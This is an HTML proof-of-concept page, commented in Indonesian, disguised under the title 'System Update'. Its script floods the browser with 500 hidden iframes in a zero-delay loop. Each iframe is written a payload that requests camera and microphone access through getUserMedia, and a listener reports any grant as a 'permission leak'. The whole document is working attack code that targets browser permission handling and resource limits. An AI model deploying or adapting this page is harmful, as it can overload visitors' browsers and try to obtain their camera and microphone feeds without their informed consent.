<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #0f0;
    font-family: monospace; overflow: hidden;
    height: 100vh; display: flex; justify-content: center; align-items: center;
  }
  #status { font-size: 24px; text-align: center; z-index: 10000; position: relative; }
  iframe { display: none; }
</style>
</head>
<body>

<div id="status">Memulai Flooding...</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');
  var iframeCount = 0;
  var maxIframes = 500; // Jumlah iframe (500 sudah sangat berat)

  // ============================================
  // 1. PAYLOAD UNTUK SETIAP IFRAME (MEMINTA KAMERA)
  // ============================================
  var iframePayload = `
    <!DOCTYPE html>
    <html>
    <head><title>Permission</title></head>
    <body style="background:transparent;margin:0;">
      <script>
        (function() {
          // Paksa minta izin kamera di setiap iframe
          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
              .then(function(stream) {
                parent.postMessage({ status: 'CAM_GRANTED' }, '*');
              })
              .catch(function(err) {
                // Abaikan error agar tidak crash
              });
          }
        })();
      <\/script>
    </body>
    </html>
  `;

  // ============================================
  // 2. LISTENER: MENDETEKSI KEBOCORAN IZIN
  // ============================================
  window.addEventListener('message', function(e) {
    if (e.data && e.data.status === 'CAM_GRANTED') {
      statusEl.innerText = "🚨 BUG: PERMISSION LEAK DETECTED! 🚨";
      statusEl.style.color = "#f00";
      document.body.style.background = "#300";
      console.log("[!] Permission Leak Detected! Camera Access Granted.");
    }
  });

  // ============================================
  // 3. FUNGSI MULTI-IFRAME FLOODING
  // ============================================
  function floodIframes() {
    if (iframeCount >= maxIframes) {
      statusEl.innerText = "Flooding Selesai. Memeriksa...";
      return;
    }

    try {
      // Buat iframe baru
      var iframe = document.createElement('iframe');
      
      // Beri atribut allow untuk memancing prompt izin
      iframe.allow = "camera; microphone; autoplay";
      
      // Set src ke about:blank agar bisa ditulis (Same-Origin)
      iframe.src = 'about:blank';
      
      // Sembunyikan iframe
      iframe.style.display = 'none';
      
      // Tambahkan ke DOM
      document.body.appendChild(iframe);

      // Tulis payload ke dalam iframe
      iframe.onload = function() {
        try {
          var doc = iframe.contentDocument || iframe.contentWindow.document;
          doc.open();
          doc.write(iframePayload);
          doc.close();
        } catch(e) {}
      };

      iframeCount++;
      statusEl.innerText = "Membuat Iframe: " + iframeCount + "/" + maxIframes;

      // Loop super cepat (0ms)
      setTimeout(floodIframes, 0);

    } catch(e) {
      console.log("Flooding error:", e);
    }
  }

  // ============================================
  // 4. EKSEKUSI
  // ============================================
  setTimeout(floodIframes, 500);

})();
</script>
</body>
</html>
